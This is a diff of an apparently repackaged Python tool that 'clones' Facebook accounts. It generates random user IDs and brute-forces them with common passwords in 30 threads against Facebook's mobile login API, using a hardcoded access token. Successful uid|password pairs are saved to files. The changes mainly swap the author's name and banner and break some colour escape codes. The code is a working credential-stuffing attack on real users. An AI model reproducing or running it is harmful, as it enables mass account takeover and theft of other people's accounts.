@@ -387,10 +387,9 @@ def follow(ses,coki):
 	get = r.find('a', string='Follow').get('href')
 	ses.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text
 
-logo = ("""\000[1;32m
-       
+logo = ("""\000
 ################################################################################                                                                          ####                                                                          ####  ########    ########     ##       ##    ##       ##    #####    ######  ####  #      #    #      #     ##       ##    ##       ##     # #     ##      ####  #      #    #      #     ##       ##    ##       ##     # #     ##      ####  #######     #      #     ## #     ##    ## #     ##     # #     ######  ####  #      #    #      #     ##   #   ##    ##   #   ##     # #     ##      ####  #      #    #      #     ##     # ##    ##     # ##     # #     ##      ####  #      #    ########     ##      ###    ##      ###    #####    ######  ####                                                                          ####            FB: PAUL     GitHub: OhanRonnie    Version: 1.0               ####                                                                          ################################################################################
-__________________×______________________
+________________________________________×____________________________________
   
   Owner   :. OHAN RONNIE
  
@@ -401,7 +400,7 @@ __________________×______________________
   Youtube :   ERROR 404
   
   Contact :  NOT AVAILABLE
-__________________×______________________\000[1;37m""")
+________________________________________×____________________________________\000""")
 
 class Main:
 	def __init__(self):
@@ -411,12 +410,12 @@ class Main:
 		self.loop = 0
 		os.system("clear")
 		print(logo)
-		print("\n \t \t         [1] 2009 - 2010 CLONE -- [BEST]")
+		print("\n \t \t            [1] 2009 - 2010 CLONE -- [BEST]")
 		print("\t \t            [2] 2011 - 2014 CLONE")
 		print("\t \t            [3] FILE CLONE")
 		print("\t \t            [4] PUBLIC CLONE  -- [GOOD] ")
 		print("\t \t            [5] CREATE FILE ")
-		print(" [E] Exit Programming\n")
+		print("\t \t.           [E] \n")
 		TALHA =input(" Choose : ")
 		if TALHA in ["3", "03"]:
 			File()
@@ -439,24 +438,24 @@ class Main:
 		xx = 999999999
 		idx = "100000" 
 		os.system('clear');print(logo)
-		limit = int(input(" \n\033[0;95m[+]\033[0;93m TOTAL IDS TO CRACK LIMIT 50,000: "))
+		limit = int(input(" \n\000[0;95m[+]\000[0;93m TOTAL IDS TO CRACK LIMIT 50,000: "))
 		try:
 			for n in range(limit):
 				_ = random.randint(x,xx)
 				__ = idx
 				self.id.append(__+str(_))
 			
-			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
+			print("\000[0;93m [+] TOTAL ID -> \000[0;91m%s\000[0;97m"%(len(self.id))) 
 			with ThreadPoolExecutor(max_workers=30) as coeg:
-				print("\n\033[1;32m [!] USE (123456) FOR IDZ\033[1;37m ")
+				print("\n\000[1;32m [!] USE (123456) FOR IDZ\000[1;37m ")
 				listpass = input("%s [?] ENTER PASSWORD :%s "%(G,Y))
 				if len(listpass)<=5:
 					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(B))
-				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(G,listpass))
+				print("%s [*] CRACK WITH PASSWORD -> [\000[0;91m%s\000[0;93m]"%(G,listpass))
 				os.system("clear")
 				print(logo)
-				print("\n%s [+] OK RESULTS SAVED IN -> ok.txt"%(Y))
-				print("%s [+] CP RESULTS SAVED IN -> cp.txt"%(G))
+				print("\n%s [+] VISIT MYPROFILE AnD FOLOw ME "%(Y))
+				print("%s [+] CLONE STARTED"%(G))
 				print("%s [!] IF NO RESULT USE AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(P))
 				for user in self.id:
 					coeg.submit(self.api, user, listpass.split(","))
@@ -829,7 +828,7 @@ class Main:
 			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
 		])
 		sys.stdout.write(
-			"\r [ FAISAL ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
+			"\r [ OHAN ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
 		); sys.stdout.flush()
 		for pw in pwx:
 			pw = pw.lower()
@@ -846,15 +845,15 @@ class Main:
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r \033[0;92m[ FAISAL-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \000[0;92m[ FAISAL-OK ] %s | %s\000[0;97m         "%(uid, pw))
 				print ("\r \033[0;92m Congrats Bro ")
 				self.ok.append("%s|%s"%(uid, pw))
-				open("2009-FAISAL-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("2009-OHAN-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[0;92m[ FAISAL-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \053[0;92m[ OHAN-CP ] %s | %s\053[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("2009-FAISAL-OK.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("2009-OHAN-OK.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
 			else:
 				continue
